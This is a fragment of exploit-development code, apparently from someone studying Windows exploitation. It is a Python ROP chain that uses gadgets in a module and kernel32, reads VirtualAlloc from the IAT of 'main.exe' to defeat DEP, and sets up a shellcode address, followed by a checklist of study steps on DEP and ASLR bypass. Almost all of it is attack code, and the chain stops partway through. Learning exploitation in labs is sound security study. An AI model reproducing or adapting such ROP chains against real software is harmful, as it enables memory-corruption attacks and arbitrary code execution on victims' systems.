...
kernel_base = 0x76f00000

rop = [
# 1. Get ESP (in eax) to adjust esp offset
    base + 0x2160, # xor eax, eax ; ret
    base + 0x1fd6, # or eax, esp ; ret

# 2. Add/subtract EBX value with EAX(esp) to land on skeleton 0x51515151
#    SKELETON ESP IS IN EAX
    base + 0x3048, # pop ecx ; ret
    0xffffffe0,    # eax - (-0x20) = skeleton call 0x61616161
    kernel_base + 0x41c64, # kernel32 add eax, ecx
    base + 0x1fe0, # mov  ebx, eax ; ret

# 3. Deref IAT virtualAlloc (in eax)
    base + 0x3047, # pop eax ; pop ecx ; ret
    0xbda1e8,      # main.exe IAT VirtualAlloc (static address)
    0xffffffff,    # junk pop ecx
    base + 0x10255,# mov eax,  [eax] ; ret

# 4. Move EAX to EBX for skeleton ESP offset adjustment to 0x62626262
#    Skeleton ESP is now in EBX
    base + 0x1fe7, # mov [ebx], eax
    base + 0x1fef, # add ebx, 0x04 ; ret

# 5. Insert Shellcode address into EBX (0x62626262)
#    VirtualAlloc() ret address
    base + 0x241c, # pop edi ; ret
    0x5c, # ebx + edi(92) = 0x90909090 Shellcode address
    kernel_base + 0x6dba3, # add ebx, edi ; dec ecx ; ret
    kernel_base + 0x18c30, # pop ebx ; ret
...
0. Bypass DEP
1. ROP w/ PUSAD                                = OK
2. How to locate base address with IAT & leaks = OK
2. ROP w/ skeleton & offsets                   = In progress
4. Bypass ASLR
'''
